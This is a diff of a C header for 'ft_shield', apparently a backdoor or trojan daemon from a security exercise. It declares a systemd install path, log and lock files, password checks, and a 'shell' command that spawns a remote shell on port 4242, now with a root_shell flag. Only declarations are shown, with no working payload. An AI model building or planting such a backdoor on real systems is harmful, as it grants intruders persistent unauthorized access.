@@ -11,6 +11,7 @@
 #include <arpa/inet.h>
 #include <sys/epoll.h>
 #include <string.h>
+#include <sys/wait.h>
 
 #define LOCK_FILE "/var/lock/ft_shield.lock"
 #define LOG_FILE "/var/log/ft_shield.log"
@@ -34,9 +35,9 @@
 #define LOG_USER_INPUT "[INPUT]: "
 #define LOG_WRONG_PASS "[INFO]: connection attempt with wrong pass\n"
 
-#define CMD_HELP "?\n"
+#define CMD_HELP "?"
 #define HELP_MSG "? show help\nshell Spawn remote shell on 4242\n"
-#define CMD_SHELL "shell\n"
+#define CMD_SHELL "shell"
 #define SHELL_MSG "Spawning shell on port 4242\n"
 
 #define SYS_DIR "/etc/systemd/system"
@@ -65,6 +66,7 @@ typedef struct {
 
 extern int userNb;
 extern EPOLL_STRUCT epoll;
+extern bool root_shell;
 
 #define EPOLL_ERROR ((EPOLL_STRUCT){.fd = -1})
 
@@ -87,6 +89,7 @@ bool password_set();
 bool ask_password(int userfd);
 
 void read_input(int userfd, EPOLL_STRUCT epoll);
+void shell(int userfd);
 
 void systemd();
 
